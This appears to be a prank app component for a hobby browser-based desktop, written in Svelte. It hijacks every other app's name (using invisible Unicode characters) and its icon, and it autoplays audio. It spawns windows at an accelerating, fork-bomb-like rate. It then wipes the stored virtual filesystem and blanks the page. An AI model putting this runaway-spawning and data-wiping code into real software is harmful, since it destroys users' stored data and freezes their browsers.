<script context="module" lang="ts">
  import apps from '../apps'
  import LightningFS from '@jkearl/lightning-fs'
  import { sessions } from '../stores'
  import { nanoid } from '../util'

  const self = apps.find((sess) => sess.name === 'DaBaby')!
  const app_names = ['DaBaby', 'SmallInfant', 'real da baby', 'actual babey!']
  const characters = [
    '\u2060', // Word Joiner
    '\u2061', // FUNCTION APPLICATION
    '\u2062', // INVISIBLE TIMES
    '\u2063', // INVISIBLE SEPARATOR
    '\u2064', // INVISIBLE PLUS
    '\u2066', // LEFT - TO - RIGHT ISOLATE
    '\u2067', // RIGHT - TO - LEFT ISOLATE
    '\u2068', // FIRST STRONG ISOLATE
    '\u2069', // POP DIRECTIONAL ISOLATE
    '\u206A', // INHIBIT SYMMETRIC SWAPPING
    '\u206B', // ACTIVATE SYMMETRIC SWAPPING
    '\u206C', // INHIBIT ARABIC FORM SHAPING
    '\u206D', // ACTIVATE ARABIC FORM SHAPING
    '\u206E', // NATIONAL DIGIT SHAPES
    '\u206F', // NOMINAL DIGIT SHAPES
    '\u200B', // Zero-Width Space
    '\u200C', // Zero Width Non-Joine
    '\u061C', // Arabic Letter Mark
    '\uFEFF', // Byte Order Mark
    '\u180E', // Mongolian Vowel Separator
    '\u00AD' // soft-hyphen
  ]

  export const encode = (a: number): string => {
    let baseidk = a.toString(characters.length)

    characters.forEach((character, index) => {
      baseidk = baseidk.replaceAll(index.toString(characters.length), character)
    })
    return baseidk
  }
  apps.forEach((app, i) => {
    app.name = app_names[i % app_names.length] + encode(i)
    app.icon =
      'https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg'
    app.component = Promise.resolve(self.component)
  })
  function spawn(timeout: number = 5000) {
    sessions.update((sessions) => [
      ...sessions,
      {
        app: self,
        minimized: false,
        id: nanoid()
      }
    ])

    if (timeout < 0.01) {
      sessions.set([])
      new LightningFS(localStorage.getItem('drive') || 'mollerOS', {
        wipe: true
      })
      document.write('<html />')
      document.documentElement.style.background = 'black'
      setTimeout(() => {
        location.reload()
      }, 5 * 1000)
    } else {
      setTimeout(() => spawn(timeout / 1.5), timeout / 1.5)
    }
  }

  spawn()
</script>

<!-- svelte-ignore a11y-media-has-caption -->
<audio
  autoplay
  loop
  src="https://api.meowpad.me/v1/download/26762-lets-go-dababy"
/>

<style>
  :global(*) {
    background-image: url('https://upload.wikimedia.org/wikipedia/en/9/98/Dababy_BabyOnBaby.jpg') !important;
    background-size: 100% 100%;
  }
</style>
